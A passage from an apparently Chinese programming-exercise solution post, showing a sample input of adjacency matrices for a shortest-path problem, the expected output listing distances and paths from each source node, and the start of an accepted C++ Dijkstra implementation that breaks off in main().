0 0 0 0 0 0 0 0 0 0 37 75\n0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 91 0 0\n0 0 0 87 0 0 0 0 0 0 64 0 0 0 0 0 0 0 0 0 0 0 0 0\n0 0 0 0 0 61 0 0 21 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0\n0 0 0 0 52 38 0 0 0 0 0 85 0 0 0 0 0 0 0 0 0 0 0 0\n0 0 81 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 72 0 0\n0 0 0 0 0 0 0 0 0 0 28 71 0 17 0 0 0 0 0 0 0 0 0 0\nKJ\n24 kp QJ jw Si MU cg td Bq qQ of hW XY kA ld EY jL zf OS Ua nS yj Dt ln lw\n0 0 0 0 0 0 0 0 88 0 86 0 84 0 0 0 0 0 59 0 0 59 0 0\n0 0 0 0 0 13 0 90 0 0 0 0 0 40 60 0 0 0 0 0 0 0 86 0\n63 0 0 0 85 0 0 0 0 0 0 0 0 0 20 0 80 0 0 0 0 44 0 96\n0 93 0 0 0 0 0 87 0 0 0 0 0 0 0 0 0 62 0 0 0 24 0 0\n0 0 0 0 0 0 0 0 0 0 76 35 0 53 0 0 0 0 0 0 91 0 0 0\n50 0 0 15 48 0 41 0 0 0 0 0 0 46 0 0 0 0 25 22 0 0 0 0\n0 0 0 0 0 0 0 0 62 0 0 0 0 0 0 83 0 65 0 0 16 0 0 0\n0 0 0 15 0 28 0 0 0 0 0 0 73 61 0 0 0 0 0 39 10 0 0 0\n0 0 84 0 0 0 0 28 0 0 0 0 0 0 0 0 0 0 94 0 0 0 0 0\n0 0 0 0 32 11 0 0 0 0 0 0 0 0 87 0 0 0 85 49 0 0 0 0\n0 0 0 20 0 29 96 0 0 43 0 0 99 0 0 0 0 0 0 0 0 64 12 0\n0 10 0 0 99 0 0 92 0 0 0 0 0 0 0 0 0 0 0 0 86 0 26 0\n0 0 0 0 45 0 0 0 0 0 0 76 0 0 0 67 0 0 0 0 0 0 0 0\n0 0 0 0 0 0 0 96 0 48 0 0 0 0 0 0 0 0 48 0 0 57 0 0\n0 0 38 0 15 98 86 11 79 83 0 0 0 0 0 62 0 0 0 0 0 21 0 0\n0 0 90 0 0 0 0 0 0 0 0 0 21 0 75 0 78 0 0 79 0 0 0 0\n54 0 0 0 0 73 0 0 0 89 0 0 0 0 83 0 0 48 0 0 0 0 99 0\n0 94 0 0 0 0 0 0 0 0 59 11 91 0 0 0 80 0 0 0 0 0 82 80\n0 0 16 0 88 0 57 0 0 0 25 78 0 0 0 0 0 0 0 41 0 50 89 0\n0 56 0 0 0 0 0 43 0 0 0 0 0 0 0 0 37 0 0 0 0 0 0 0\n0 87 0 0 0 0 0 0 0 0 0 0 0 12 0 79 0 0 0 0 0 0 26 0\n0 0 86 84 0 0 0 0 0 0 94 0 0 0 0 0 54 58 0 0 24 0 18 0\n0 0 0 0 91 0 0 0 32 20 35 86 35 0 0 0 27 0 0 0 0 0 0 0\n56 0 0 0 0 0 0 0 0 90 0 0 0 0 67 0 0 40 25 0 0 0 0 0\nDt\n23 xh xO TO Tc ZR iN ei Jo Gj ut Ed bu kI BP Lj DK VN rj TH WU Bw XL oC\n0 28 0 0 0 0 97 0 47 95 64 0 10 0 0 82 0 0 0 0 0 0 15\n0 0 0 0 98 49 0 64 25 41 0 0 0 0 71 87 54 0 0 59 26 0 0\n20 0 0 0 0 0 0 0 0 0 0 0 0 47 58 36 0 0 0 83 13 0 0\n0 0 73 0 44 85 0 0 0 0 0 0 54 0 0 19 26 0 72 96 0 0 0\n38 0 0 0 0 24 0 0 0 67 33 0 0 0 0 0 90 14 0 81 86 62 0\n0 0 22 87 36 0 0 69 0 0 0 0 0 0 0 86 85 0 57 0 12 0 62\n26 96 0 67 71 0 0 43 0 0 0 60 97 72 0 0 67 0 77 79 0 0 0\n50 11 91 0 0 0 0 0 0 63 24 0 0 0 0 0 28 0 35 70 0 0 25\n0 0 0 0 0 0 0 0 0 0 50 0 0 0 0 0 0 0 82 0 0 82 0\n0 0 0 58 0 0 0 39 67 0 0 28 33 13 0 12 54 0 47 0 95 69 0\n72 0 69 0 0 0 53 0 68 0 0 99 0 53 0 10 53 0 0 20 0 0 0\n0 0 28 96 38 67 0 53 0 93 87 0 62 0 0 0 0 0 38 53 42 49 77\n35 0 0 0 32 0 0 0 99 42 0 52 0 78 98 0 58 0 14 0 18 0 17\n58 0 0 0 55 0 0 94 17 69 60 24 99 0 0 0 98 58 48 38 31 72 71\n30 0 52 0 0 0 25 0 0 99 63 0 50 20 0 99 50 49 68 0 0 0 0\n46 0 0 25 0 0 68 46 0 65 0 27 95 88 0 0 41 67 99 0 0 0 21\n27 20 37 43 0 15 0 0 0 0 0 33 0 0 0 27 0 78 22 65 0 59 0\n12 77 31 0 80 0 0 0 0 0 0 70 77 79 0 57 0 0 0 0 0 82 0\n0 93 0 0 0 0 0 82 14 29 0 57 0 46 0 0 0 67 0 0 0 0 0\n0 0 0 37 53 54 0 0 0 0 22 46 39 82 80 0 0 0 0 0 26 0 84\n43 51 13 0 92 81 0 74 16 0 100 47 50 0 20 0 0 34 0 0 0 100 0\n0 0 0 0 22 0 0 0 0 0 57 94 52 42 92 27 19 27 0 71 0 0 32\n72 34 98 0 0 85 11 70 0 0 0 86 30 0 0 0 0 0 0 0 0 0 0\nLj\n24 dj BK Ce jl re OT uL aF iU aw XG kc VM eq RV Pw fj lD Xk JN km Hq XT ZN\n0 0 0 0 0 0 0 43 0 0 0 0 29 0 0 0 0 23 0 0 0 0 0 0\n0 0 0 0 0 0 0 60 0 0 0 0 50 0 0 0 82 0 0 0 0 0 0 0\n0 0 0 57 0 0 0 0 0 0 0 52 0 0 0 0 0 0 0 0 0 48 29 0\n0 0 0 0 0 0 0 0 0 0 0 20 0 0 87 0 25 0 0 0 0 0 0 52\n0 0 0 0 0 23 0 0 0 0 0 0 92 0 0 33 0 0 21 0 0 0 0 0\n0 0 0 12 0 0 0 0 0 0 0 67 0 0 0 0 48 0 0 0 0 0 0 0\n0 0 0 0 46 0 0 0 0 0 0 0 0 0 0 0 0 0 72 0 0 0 0 0\n11 0 0 0 74 0 78 0 0 0 45 0 0 0 48 0 0 0 94 0 0 0 44 0\n0 0 0 0 0 0 0 0 0 42 0 0 0 0 0 88 0 0 71 0 0 0 0 0\n0 0 71 0 0 84 0 0 0 0 0 0 0 97 0 0 0 0 0 0 66 0 0 0\n0 0 0 0 0 0 99 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 11 0\n0 87 0 0 0 0 69 10 70 0 0 0 0 36 0 0 0 0 0 0 0 17 92 0\n0 0 0 0 0 49 26 0 0 53 0 0 0 0 0 0 0 0 0 0 0 0 0 0\n71 0 0 70 71 0 0 0 0 37 34 0 0 0 0 82 0 0 0 0 54 0 0 0\n0 97 0 0 0 0 0 0 0 0 0 0 0 0 0 13 0 56 0 79 0 0 0 64\n0 0 54 94 0 0 49 0 80 0 0 0 49 0 0 0 0 49 0 0 0 50 0 0\n41 0 0 0 90 0 0 0 0 0 0 0 0 0 0 56 0 0 0 0 0 0 0 0\n0 52 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0\n97 0 0 0 26 32 0 0 0 0 0 100 0 0 0 0 0 0 0 0 0 18 0 73\n0 0 0 0 17 0 0 0 0 0 0 0 0 0 0 0 0 0 96 0 0 0 0 50\n63 0 0 0 0 0 19 0 0 81 0 0 0 0 0 0 86 0 44 0 0 0 0 0\n0 0 0 0 97 0 86 0 0 0 0 0 0 0 0 45 0 0 48 0 0 0 0 0\n0 0 0 0 0 0 0 0 0 49 0 0 0 17 0 0 0 0 0 0 77 23 0 0\n0 99 0 23 0 0 0 0 0 0 0 21 0 0 0 0 0 0 0 0 0 27 0 0\niU\n22 So dE nD Vo CZ GW hj pp Wk tQ rl SZ YV Dd qx ic hU uo Sf uR QA AP\n0 0 94 0 0 0 0 37 0 0 0 0 0 0 0 0 0 0 0 0 0 0\n0 0 0 0 0 0 0 0 0 0 0 12 0 0 31 0 0 89 0 75 0 0\n0 0 0 0 0 0 0 0 0 0 0 0 0 0 35 0 39 88 33 0 0 0\n0 0 0 0 0 0 39 0 94 0 0 0 0 0 86 93 0 0 0 0 0 0\n0 0 0 0 0 0 0 17 0 0 0 0 0 90 0 0 0 0 0 0 0 0\n0 0 0 0 0 0 0 0 0 0 0 0 0 82 0 0 0 0 0 0 12 0\n0 0 0 0 0 88 0 0 0 0 57 97 0 82 0 0 0 30 0 0 0 15\n0 0 0 90 0 33 54 0 0 0 0 0 0 0 0 0 0 0 10 0 0 0\n0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0\n0 0 48 0 0 0 0 0 82 0 16 0 0 0 63 0 0 0 0 0 0 0\n11 0 0 43 93 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0\n0 0 23 0 0 0 0 0 0 0 0 0 0 31 0 0 0 0 0 0 52 19\n0 0 0 0 0 18 0 0 0 54 0 0 0 0 0 0 0 88 0 0 0 0\n0 0 0 0 0 0 0 0 0 0 0 29 0 0 0 0 0 0 0 0 0 0\n0 0 0 0 0 0 46 0 0 0 0 0 70 0 0 0 0 0 0 0 0 66\n0 0 0 0 0 82 74 0 0 0 0 0 0 0 0 0 99 0 0 0 0 0\n0 0 0 0 0 0 0 0 90 0 0 0 0 0 0 0 0 0 0 0 0 0\n0 0 0 95 0 0 0 0 0 0 0 0 64 0 0 0 0 0 0 0 67 0\n0 0 0 0 0 0 0 0 0 0 0 0 0 0 28 0 0 0 0 0 0 0\n0 85 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0\n0 0 0 0 0 0 64 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0\n0 0 0 0 0 0 0 93 0 0 0 0 0 0 0 0 0 0 0 0 0 0\nQA\n23 UZ wD kG aA mm TZ lo bm QD XK ch MI Jn Rn el CA aC Nm BU pa kU Gs oR\n0 0 0 0 0 95 0 0 0 19 0 0 0 49 0 0 0 0 10 0 0 0 0\n0 0 22 0 0 0 29 0 0 0 49 0 0 54 0 63 0 0 0 0 0 0 26\n0 48 0 0 0 66 0 0 80 0 47 0 0 0 0 0 0 32 55 30 0 0 0\n0 0 94 0 0 0 0 15 17 0 0 0 86 0 0 0 0 0 0 0 54 0 0\n0 54 0 0 0 0 0 0 0 0 0 0 52 0 0 0 0 0 0 0 0 0 0\n98 0 0 0 0 0 70 0 0 0 0 0 0 0 88 52 0 44 0 0 30 0 0\n0 0 0 0 0 0 0 0 0 0 0 0 53 0 0 0 0 0 0 0 0 0 42\n0 0 0 0 0 19 0 0 0 0 0 0 0 0 0 0 0 62 0 0 0 0 0\n0 68 0 62 0 99 0 0 0 0 0 25 0 35 0 0 0 0 0 0 84 0 0\n0 0 0 14 0 0 0 0 92 0 61 0 0 0 0 0 0 0 70 0 80 21 61\n0 0 53 0 0 36 87 0 0 0 0 0 16 41 90 0 0 0 0 17 0 0 12\n0 0 0 14 0 0 0 47 0 0 19 0 0 0 0 0 0 0 0 31 0 0 0\n0 0 76 22 0 0 73 32 0 31 0 0 0 0 0 0 0 0 0 0 0 0 0\n0 19 0 0 0 0 0 74 10 0 0 0 37 0 0 50 79 0 0 0 0 0 53\n0 0 0 0 0 0 72 0 0 0 78 0 0 62 0 0 0 23 0 0 53 47 0\n88 0 31 0 0 35 0 0 0 0 0 91 57 0 0 0 0 0 0 0 0 10 27\n0 0 0 0 0 29 0 0 0 0 0 0 0 0 0 0 0 88 36 0 0 0 0\n0 0 0 0 0 0 48 0 0 0 0 0 0 0 0 17 0 0 34 43 0 0 0\n0 0 0 0 0 82 0 0 0 0 0 0 0 95 64 0 0 78 0 0 30 0 0\n0 0 0 0 0 0 0 0 0 0 0 24 0 0 0 0 0 0 0 0 0 0 0\n0 0 19 0 0 0 0 0 0 0 0 0 0 0 0 0 37 44 0 0 0 26 0\n73 0 24 0 61 0 0 0 0 70 0 0 0 50 0 0 0 0 63 0 17 0 66\n0 99 0 62 76 0 0 0 0 0 0 0 0 0 0 0 41 17 0 0 0 34 0\nkG\n24 Vs Zg dR JD Zq gD pF ff EH qk JA Qj xG Mh TJ mT qw Hp vK OQ IA SZ Jj Mn\n0 17 0 0 0 0 75 0 0 0 0 23 0 0 0 62 0 96 0 0 0 0 0 0\n0 0 0 0 0 0 0 0 47 88 0 0 0 0 0 0 0 0 0 93 12 0 0 95\n24 10 0 0 0 58 0 0 82 0 0 0 0 98 0 0 51 0 0 0 0 0 0 0\n0 0 36 0 0 0 0 0 0 0 0 26 0 0 0 0 0 0 0 0 0 80 10 0\n0 76 0 52 0 83 75 49 0 0 0 0 0 0 0 57 22 0 0 0 0 38 0 16\n0 0 0 0 71 0 0 0 0 0 0 0 0 0 87 0 0 0 0 0 0 92 32 0\n0 0 0 0 0 99 0 0 0 0 0 60 0 46 0 37 0 0 13 0 0 0 0 0\n0 71 88 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 45 0 0 0 0\n0 0 70 22 0 0 0 0 0 0 0 0 0 0 53 0 46 0 0 0 0 0 0 0\n48 80 0 0 70 0 0 0 0 0 0 0 81 0 24 0 0 0 0 0 0 41 0 0\n0 0 80 0 0 0 67 56 0 0 0 0 0 0 74 0 0 75 0 0 0 0 0 0\n0 0 95 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0\n65 0 0 0 0 0 30 0 0 0 0 73 0 0 0 0 0 0 0 0 0 0 0 0\n0 0 22 18 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0\n0 0 0 0 0 39 0 0 0 0 0 0 38 27 0 0 0 20 0 0 0 0 27 0\n51 0 0 0 0 0 0 0 0 0 0 0 0 0 47 0 0 51 0 0 0 0 0 0\n0 0 39 0 0 0 0 0 0 0 0 0 0 22 0 0 0 0 0 0 99 80 0 0\n0 0 17 0 0 0 0 0 0 0 0 86 0 0 0 0 58 0 42 47 0 0 23 78\n71 46 0 39 56 0 0 24 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0\n0 0 0 0 12 58 79 49 0 0 0 0 0 0 10 0 0 0 0 0 25 0 0 87\n0 98 0 0 0 0 0 0 0 0 77 0 0 32 0 0 0 0 0 0 0 0 0 0\n0 0 71 0 87 0 0 0 0 0 40 74 0 0 64 0 0 19 0 0 0 0 0 0\n0 0 0 0 88 0 26 92 0 91 47 0 91 0 0 0 0 0 0 0 90 0 0 0\n28 0 75 0 0 0 0 0 0 19 89 0 0 33 0 0 84 51 66 0 0 0 0 0\nvK\n```\n\n样例2输出：\n\n```\nys-Hv-195----[ys Rc uf oR Hv ]\nys-FM-83----[ys Rc FM ]\nys-uA-144----[ys Xz bb uA ]\nys-uf-123----[ys Rc uf ]\nys-wK-255----[ys Ll sr wK ]\nys-sJ-248----[ys Xz bb Nf sJ ]\nys-Ll-61----[ys Ll ]\nys-Xz-80----[ys Xz ]\nys-Rc-48----[ys Rc ]\nys-dj-163----[ys Rc uf dj ]\nys-UP-139----[ys Rc UP ]\nys-IP-278----[ys Rc FM WL Yq IP ]\nys-sr-155----[ys Ll sr ]\nys-Nf-189----[ys Xz bb Nf ]\nys-Jx-32----[ys Jx ]\nys-Mn--1\nys-eA--1\nys-WL-174----[ys Rc FM WL ]\nys-ek-230----[ys Ll sr ek ]\nys-bb-121----[ys Xz bb ]\nys-Yq-259----[ys Rc FM WL Yq ]\nys-dz--1\nys-oR-155----[ys Rc uf oR ]\nHI-NO-78----[HI kv FX yk NO ]\nHI-Kh-38----[HI Kh ]\nHI-LZ-72----[HI kv FX LZ ]\nHI-mu-56----[HI fO Uw mu ]\nHI-Uw-46----[HI fO Uw ]\nHI-FX-48----[HI kv FX ]\nHI-Jj-64----[HI NX Jj ]\nHI-Jn-47----[HI Jn ]\nHI-NX-52----[HI NX ]\nHI-FD-79----[HI fO Uw mu FD ]\nHI-uC-89----[HI fO Uw mu uC ]\nHI-fO-21----[HI fO ]\nHI-Kp-82----[HI kv FX LZ Kp ]\nHI-gY-66----[HI fO Uw gY ]\nHI-lm-65----[HI Jn lm ]\nHI-yk-58----[HI kv FX yk ]\nHI-sS-66----[HI sS ]\nHI-bu-70----[HI fO Uw bu ]\nHI-tB-59----[HI kv FX tB ]\nHI-MG-62----[HI fO MG ]\nHI-yP-63----[HI Jn yP ]\nHI-kv-17----[HI kv ]\nHI-is-55----[HI fO is ]\nyA-xS-194----[yA zG ah lV BN xS ]\nyA-FA-107----[yA Bw FA ]\nyA-jT-98----[yA jT ]\nyA-uu-94----[yA zG uu ]\nyA-BH-105----[yA zG BH ]\nyA-Ze-139----[yA Bw FA Ze ]\nyA-Zg-96----[yA zG ah lV Zg ]\nyA-zG-48----[yA zG ]\nyA-Bw-45----[yA Bw ]\nyA-nO-123----[yA jT nO ]\nyA-iJ-154----[yA Bw cG bA iJ ]\nyA-bA-123----[yA Bw cG bA ]\nyA-ff-159----[yA Bw FA ff ]\nyA-BN-144----[yA zG ah lV BN ]\nyA-cG-99----[yA Bw cG ]\nyA-lV-81----[yA zG ah lV ]\nyA-ZL-85----[yA zG ah ZL ]\nyA-ah-65----[yA zG ah ]\nyA-mP-117----[yA zG ah lV mP ]\nyA-TS-212----[yA Bw FA Ze TS ]\nyA-Jh-118----[yA zG ah ZL Jh ]\nSH-Cq-87----[SH Ay eH Cq ]\nSH-em-146----[SH dO em ]\nSH-Ay-10----[SH Ay ]\nSH-uA-79----[SH uA ]\nSH-eH-43----[SH Ay eH ]\nSH-Tq-67----[SH Ay Tq ]\nSH-yd-129----[SH dO kl yd ]\nSH-nY-77----[SH dO kl nY ]\nSH-Nz-144----[SH dO Nz ]\nSH-nm-139----[SH dO kl uv nm ]\nSH-kl-61----[SH dO kl ]\nSH-yu-121----[SH Ay eH Sb yu ]\nSH-eR-101----[SH Ay Tq eR ]\nSH-UH-89----[SH Ay UH ]\nSH-YP-122----[SH Ay eH Cq YP ]\nSH-FB-121----[SH dO FB ]\nSH-gs-104----[SH Ay eH Sb gs ]\nSH-MB-111----[SH uA MB ]\nSH-dO-50----[SH dO ]\nSH-Sb-83----[SH Ay eH Sb ]\nSH-uv-104----[SH dO kl uv ]\nSH-aO-142----[SH Ay UH aO ]\nSH-uf-191----[SH dO kl yd uf ]\nSH-gu-102----[SH uA gu ]\nYz-kd-90----[Yz uJ Zs nf kd ]\nYz-di-18----[Yz di ]\nYz-Da-64----[Yz di Da ]\nYz-Cz-43----[Yz Cz ]\nYz-Rw-31----[Yz Rw ]\nYz-Zs-33----[Yz uJ Zs ]\nYz-jt-14----[Yz jt ]\nYz-of-46----[Yz jt of ]\nYz-nf-63----[Yz uJ Zs nf ]\nYz-QP-47----[Yz uJ QP ]\nYz-wq-64----[Yz di wq ]\nYz-tZ-48----[Yz di tZ ]\nYz-AY-99----[Yz jt MW AY ]\nYz-MW-30----[Yz jt MW ]\nYz-Py-74----[Yz jt MW Py ]\nYz-ZK-71----[Yz jt ZK ]\nYz-TD-75----[Yz uJ Zs nf TD ]\nYz-uJ-17----[Yz uJ ]\nYz-Ew-48----[Yz uJ Zs Ew ]\nWg-wm-42----[Wg bQ wm ]\nWg-bQ-18----[Wg bQ ]\nWg-Er-90----[Wg Er ]\nWg-OY-116----[Wg oI OY ]\nWg-od-162----[Wg PS Ew od ]\nWg-xz-213----[Wg PS eV Bc xz ]\nWg-jN-100----[Wg bQ wm jN ]\nWg-PS-35----[Wg PS ]\nWg-eV-110----[Wg PS eV ]\nWg-LF-106----[Wg bQ wm LF ]\nWg-Yr-97----[Wg PS yd Yr ]\nWg-Dk-104----[Wg Er Dk ]\nWg-cN-151----[Wg Er cN ]\nWg-cq-91----[Wg PS Ew cq ]\nWg-WV-154----[Wg bQ wm LF WV ]\nWg-Ew-65----[Wg PS Ew ]\nWg-dn-109----[Wg PS yd dn ]\nWg-uF-132----[Wg bQ wm LF uF ]\nWg-yd-69----[Wg PS yd ]\nWg-oI-61----[Wg oI ]\nWg-Bc-156----[Wg PS eV Bc ]\nAA-qL-103----[AA Ox qL ]\nAA-kN-107----[AA Ox xB kN ]\nAA-fx-114----[AA Ox QQ fx ]\nAA-wz-39----[AA Ox wz ]\nAA-Qe-59----[AA Ox Qe ]\nAA-bS-60----[AA Ge bS ]\nAA-MP-26----[AA MP ]\nAA-xB-68----[AA Ox xB ]\nAA-Ox-19----[AA Ox ]\nAA-LY-70----[AA Qg LY ]\nAA-xY-73----[AA Ge xY ]\nAA-ds-119----[AA Ox qL ds ]\nAA-fC--1\nAA-Ge-35----[AA Ge ]\nAA-Qg-58----[AA Qg ]\nAA-xr-80----[AA Ge xr ]\nAA-kR-41----[AA MP kR ]\nAA-EM-33----[AA Ox EM ]\nAA-QF-111----[AA MP QF ]\nAA-oY-60----[AA Ox oY ]\nAA-QQ-44----[AA Ox QQ ]\nKJ-iW-147----[KJ ma iW ]\nKJ-OV-117----[KJ my Aw OV ]\nKJ-xm-168----[KJ my pB iM xm ]\nKJ-ma-87----[KJ ma ]\nKJ-pB-74----[KJ my pB ]\nKJ-sA-160----[KJ my cn sA ]\nKJ-EK-80----[KJ my EK ]\nKJ-qD-139----[KJ my Aw OV qD ]\nKJ-Aw-96----[KJ my Aw ]\nKJ-cn-102----[KJ my cn ]\nKJ-my-64----[KJ my ]\nKJ-Kg-115----[KJ my cn Kg ]\nKJ-nP-152----[KJ ma nP ]\nKJ-zN-136----[KJ my pB gu zN ]\nKJ-zK-186----[KJ my Aw OV qD zK ]\nKJ-Nn-136----[KJ my cn Kg Nn ]\nKJ-gu-101----[KJ my pB gu ]\nKJ-JH-144----[KJ my Aw JH ]\nKJ-sX-169----[KJ ma sX ]\nKJ-Od-121----[KJ my Od ]\nKJ-Mm-125----[KJ my pB gu Mm ]\nKJ-iM-87----[KJ my pB iM ]\nKJ-wQ-142----[KJ my Aw wQ ]\nDt-kp-99----[Dt ln zf kp ]\nDt-QJ-79----[Dt OS XY QJ ]\nDt-jw-86----[Dt jw ]\nDt-Si-64----[Dt ln of cg Si ]\nDt-MU-70----[Dt ln of MU ]\nDt-cg-49----[Dt ln of cg ]\nDt-td-90----[Dt ln of cg td ]\nDt-Bq-78----[Dt ln qQ Bq ]\nDt-qQ-50----[Dt ln qQ ]\nDt-of-38----[Dt ln of ]\nDt-hW-53----[Dt ln hW ]\nDt-XY-69----[Dt OS XY ]\nDt-kA-53----[Dt ln kA ]\nDt-ld-36----[Dt yj ld ]\nDt-EY-106----[Dt jw EY ]\nDt-jL-103----[Dt yj jL ]\nDt-zf-45----[Dt ln zf ]\nDt-OS-58----[Dt OS ]\nDt-Ua-74----[Dt ln of cg Ua ]\nDt-nS-71----[Dt ln of cg nS ]\nDt-yj-24----[Dt yj ]\nDt-ln-18----[Dt ln ]\nDt-lw-138----[Dt OS lw ]\nLj-xh-30----[Lj xh ]\nLj-xO-58----[Lj xh xO ]\nLj-TO-52----[Lj TO ]\nLj-Tc-92----[Lj ei Tc ]\nLj-ZR-72----[Lj xh kI ZR ]\nLj-iN-65----[Lj VN iN ]\nLj-ei-25----[Lj ei ]\nLj-Jo-68----[Lj ei Jo ]\nLj-Gj-37----[Lj BP Gj ]\nLj-ut-82----[Lj xh kI ut ]\nLj-Ed-63----[Lj Ed ]\nLj-bu-44----[Lj BP bu ]\nLj-kI-40----[Lj xh kI ]\nLj-BP-20----[Lj BP ]\nLj-DK-73----[Lj Ed DK ]\nLj-VN-50----[Lj VN ]\nLj-rj-49----[Lj rj ]\nLj-TH-54----[Lj xh kI TH ]\nLj-WU-58----[Lj BP WU ]\nLj-Bw-51----[Lj BP Bw ]\nLj-XL-92----[Lj BP XL ]\nLj-oC-45----[Lj xh oC ]\niU-dj-156----[iU Xk OT jl kc aF dj ]\niU-BK-189----[iU Pw lD BK ]\niU-Ce-113----[iU aw Ce ]\niU-jl-115----[iU Xk OT jl ]\niU-re-97----[iU Xk re ]\niU-OT-103----[iU Xk OT ]\niU-uL-127----[iU aw km uL ]\niU-aF-145----[iU Xk OT jl kc aF ]\niU-aw-42----[iU aw ]\niU-XG-173----[iU aw eq XG ]\niU-kc-135----[iU Xk OT jl kc ]\niU-VM-137----[iU Pw VM ]\niU-eq-139----[iU aw eq ]\niU-RV-193----[iU Xk OT jl kc aF RV ]\niU-Pw-88----[iU Pw ]\niU-fj-140----[iU Xk OT jl fj ]\niU-lD-137----[iU Pw lD ]\niU-Xk-71----[iU Xk ]\niU-JN-272----[iU Xk OT jl kc aF RV JN ]\niU-km-108----[iU aw km ]\niU-Hq-89----[iU Xk Hq ]\niU-XT-142----[iU aw Ce XT ]\niU-ZN-144----[iU Xk ZN ]\nQA-So-132----[QA hj rl So ]\nQA-dE--1\nQA-nD-184----[QA hj SZ nD ]\nQA-Vo-164----[QA hj rl Vo ]\nQA-CZ-214----[QA hj rl CZ ]\nQA-GW-152----[QA hj GW ]\nQA-hj-64----[QA hj ]\nQA-pp-169----[QA hj rl So pp ]\nQA-Wk-258----[QA hj rl Vo Wk ]\nQA-tQ-212----[QA hj uo YV tQ ]\nQA-rl-121----[QA hj rl ]\nQA-SZ-161----[QA hj SZ ]\nQA-YV-158----[QA hj uo YV ]\nQA-Dd-146----[QA hj Dd ]\nQA-qx-207----[QA hj rl So pp Sf qx ]\nQA-ic-257----[QA hj rl Vo ic ]\nQA-hU-223----[QA hj SZ nD hU ]\nQA-uo-94----[QA hj uo ]\nQA-Sf-179----[QA hj rl So pp Sf ]\nQA-uR--1\nQA-AP-79----[QA hj AP ]\nkG-UZ-132----[kG Nm CA Gs UZ ]\nkG-wD-48----[kG wD ]\nkG-aA-68----[kG pa MI aA ]\nkG-mm-120----[kG Nm CA Gs mm ]\nkG-TZ-66----[kG TZ ]\nkG-lo-77----[kG wD lo ]\nkG-bm-83----[kG pa MI aA bm ]\nkG-QD-80----[kG QD ]\nkG-XK-94----[kG ch Jn XK ]\nkG-ch-47----[kG ch ]\nkG-MI-54----[kG pa MI ]\nkG-Jn-63----[kG ch Jn ]\nkG-Rn-88----[kG ch Rn ]\nkG-el-119----[kG BU el ]\nkG-CA-49----[kG Nm CA ]\nkG-aC-100----[kG ch oR aC ]\nkG-Nm-32----[kG Nm ]\nkG-BU-55----[kG BU ]\nkG-pa-30----[kG pa ]\nkG-kU-76----[kG Nm CA Gs kU ]\nkG-Gs-59----[kG Nm CA Gs ]\nkG-oR-59----[kG ch oR ]\nvK-Vs-71----[vK Vs ]\nvK-Zg-46----[vK Zg ]\nvK-dR-75----[vK JD dR ]\nvK-JD-39----[vK JD ]\nvK-Zq-56----[vK Zq ]\nvK-gD-118----[vK ff OQ TJ gD ]\nvK-pF-75----[vK JD Jj pF ]\nvK-ff-24----[vK ff ]\nvK-EH-93----[vK Zg EH ]\nvK-qk-91----[vK Zq Mn qk ]\nvK-JA-96----[vK JD Jj JA ]\nvK-Qj-65----[vK JD Qj ]\nvK-xG-117----[vK ff OQ TJ xG ]\nvK-Mh-90----[vK Zg IA Mh ]\nvK-TJ-79----[vK ff OQ TJ ]\nvK-mT-112----[vK JD Jj pF mT ]\nvK-qw-78----[vK Zq qw ]\nvK-Hp-99----[vK ff OQ TJ Hp ]\nvK-OQ-69----[vK ff OQ ]\nvK-IA-58----[vK Zg IA ]\nvK-SZ-94----[vK Zq SZ ]\nvK-Jj-49----[vK JD Jj ]\nvK-Mn-72----[vK Zq Mn ]\n```\n\n\n\nAC代码：\n\n```cpp\n#include<iostream>\n#include<map>\n#include<cstring>\n#include<stack>\nusing namespace std;\n\n#define maxn 1000\n#define inf 0x3f3f3f3f\n\nint g[maxn][maxn];\nstring name[maxn];\nint dis[maxn], path[maxn];\nbool final[maxn];\nstack<int>ans[500];\n\nvoid init()\n{\n\tmemset(g, 0, sizeof g);\n\tmemset(final, 0, sizeof final);\n\tfor (int i = 0; i < maxn; i++)name[i] = \"\", dis[i] = inf, path[i] = -1;\n}\n\nvoid dij(int st, int n)\n{\n\tfor (int i = 0; i < n; i++)\n\t{\n\t\tif(g[st][i])dis[i] = g[st][i];\n\t\tif (dis[i] != inf)path[i] = st;\n\t}\n\tdis[st] = 0;\n\tpath[0] == 0;\n\tfinal[st] = 1;\n\tfor (int i = 0; i < n; i++)\n\t{\n\t\tint mindis = inf, id;\n\t\tfor (int j = 0; j < n; j++)\n\t\t{\n\t\t\tif (!final[j] && dis[j] < mindis)\n\t\t\t{\n\t\t\t\tmindis = dis[j];\n\t\t\t\tid = j;\n\t\t\t}\n\t\t}\n\t\tif (mindis == inf)break;\n\t\tfinal[id] = 1;\n\t\tfor (int j = 0; j < n; j++)\n\t\t{\n\t\t\tif (!final[j] && dis[id] + g[id][j] < dis[j])\n\t\t\t{\n\t\t\t\tdis[j] = dis[id] + g[id][j];\n\t\t\t\tpath[j] = id;\n\t\t\t}\n\t\t}\n\t}\n\n\tfor (int i = 0; i < n; i++)\n\t{\n\t\tif (i == st)continue;\n\t\tint pos = i;\n\t\twhile (pos != st)\n\t\t{\n\t\t\tif (path[pos] < 0)break;\n\t\t\tans[i].push(pos);\n\t\t\tpos = path[pos];\n\t\t}\n\t\tans[i].push(st);\n\t}\n\tfor (int i = 0; i < n; i++)\n\t{\n\t\tif (i == st)continue;\n\t\tif (ans[i].size() == 1)\n\t\t{\n\t\t\tcout << name[st] << '-' << name[i] << \"--1\" << endl;\n\t\t}\n\t\telse {\n\t\t\tcout << name[st] << '-' << name[i] << '-' << dis[i];\n\t\t\tcout << \"----[\";\n\t\t\twhile (!ans[i].empty())\n\t\t\t{\n\t\t\t\tcout << name[ans[i].top()] << ' ';\n\t\t\t\tans[i].pop();\n\t\t\t}\n\t\t\tcout << \"]\\n\";\n\t\t}\n\t}\n}\n\nint main()\n{\n\tint t, 